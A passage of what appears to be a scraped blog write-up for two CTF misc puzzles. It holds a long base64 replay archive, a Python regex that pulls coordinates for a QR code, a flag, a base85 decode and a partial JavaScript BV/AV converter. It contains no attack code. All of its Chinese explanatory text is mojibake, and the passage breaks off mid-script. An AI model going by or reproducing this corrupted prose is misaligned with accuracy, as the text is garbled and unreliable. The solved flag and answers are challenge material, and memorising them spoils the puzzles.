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&quot;</span>,<span class="attr">&quot;playerDataDelta&quot;</span>:&#123;<span class="attr">&quot;modified&quot;</span>:&#123;&#125;,<span class="attr">&quot;deleted&quot;</span>:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ replay çš„æ•°æ®æ˜¯ä¸€æ®µ base64 ç¼–ç ï¼Œå°†å…¶è§£ç åå¯å¾—ä¸€å‹ç¼©åŒ…ã€‚ä¿®æ­£å…¶æ–‡ä»¶å¤´ä¸º <code>50 4B 03 04</code> ä¹‹åå¯ä»¥è§£å‹å¾—åˆ°å¦‚ä¸‹æ•°æ®ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613400294020/b5ad967d3747e19900a851948dbd2e397263fbd8.png"></p><p>é€šè¿‡è§‚å¯Ÿä¸éš¾å‘ç°å…¶ä¸­åŒ…å«åæ ‡æ•°æ®ï¼Œä½¿ç”¨æ­£åˆ™åŒ¹é…å°†å…¶å–å‡ºåæ•´ç†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">regex = <span class="string">r&quot;&#123;\&quot;row\&quot;:(\d&#123;2&#125;),\&quot;col\&quot;:(\d&#123;2&#125;)&#125;&#125;&quot;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;F:\\CTFs\\2021\\HGAME\\Misc\\A R K\\default_entry&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">content = file.read()</span><br><span class="line">file.close()</span><br><span class="line">matches = re.findall(regex, content, re.MULTILINE)</span><br><span class="line"><span class="built_in">print</span>(matches)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Excel ç”»å‡ºåæ ‡æ•£ç‚¹å›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613399763417/f841baa0b6c01f42c871bd01f3d4c507685fca84.png"></p><p>æ‰«æäºŒç»´ç å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Did_y0u_ge7_Dusk?&#125;</span><br></pre></td></tr></table></figure><h3 id="A-R-C"><a href="#A-R-C" class="headerlink" title="A R C"></a>A R C</h3><p>å°†å›¾ç‰‡ä¸­å†…å®¹æŠ„å–å‡ºæ¥ï¼Œå¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BK0ICG]Qr*88_$gC,&#39;-j2+KH86?Q&quot;%928;LG@O*!Am0+&#96;;E7iV2agSE&lt;c&#39;U;6Yg^#H?!YBAQ]</span><br></pre></td></tr></table></figure><p>å°†å…¶ base85 è§£ç ä¸€æ¬¡å¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h8btxsWpHnJEj1aL5G3gBuMTKNPAwcF4fZodR9XQ7DSUVm2yCkr6zqiveY</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºå¯çŸ¥è¿™æ˜¯ BV å·å’Œ AV å·è½¬æ¢çš„æ—¶å€™æ‰€ç”¨çš„ tableã€‚ç½‘ä¸Šæ‰¾ä¸ªç¼–ç  BV å·çš„è„šæœ¬å¹¶æ¢ä¸€ä¸‹è¡¨ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">title</span>&gt;</span>bv2av<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">p</span>&gt;</span>BV &lt;-&gt; AV<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;bv&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;BV&quot;</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;AV2bv()&quot;</span>&gt;</span>&lt;-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;bv2av()&quot;</span>&gt;</span>-&gt;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;av&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;AV&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Â Â Â Â <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="comment">// ä½œè€…ï¼šmcfx</span></span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="comment">// é“¾æ¥ï¼šhttps://www.zhihu.com/question/381784377/answer/1099438784</span></span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="comment">// æ¥æºï¼šçŸ¥ä¹</span></span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="comment">// è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</span></span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="function"><span class="keyword">function</span> <span class="title">bv2av</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">const</span> bv = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;bv&#x27;</span>).value;</span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â Â Â Â Â <span class="built_in">document</span>.getElementById(<span class="string">&#x27;av&#x27;</span>).value = dec(bv);</span></span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="function"><span class="keyword">function</span> <span class="title">AV2bv</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">const</span> av = +<span class="built_in">document</span>.getElementById(<span class="string">&#x27;av&#x27;</span>).value;</span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â Â Â Â Â <span class="built_in">document</span>.getElementById(<span class="string">&#x27;bv&#x27;</span>).value = enc(av);</span></span><br><span class="line">Â Â Â Â Â Â Â Â &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="keyword">const</span> table = <span class="string">&#x27;h8btxsWpHnJEj1aL5G3gBuMTKNPAwcF4fZodR9XQ7DSUVm2yCkr6zqiveY&#x27;</span></span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="keyword">const</span> tr = &#123;&#125;</span></span><br><span class="line"><span class="javascript">Â Â Â Â Â Â Â Â <span class="keyword">for</span> (<span 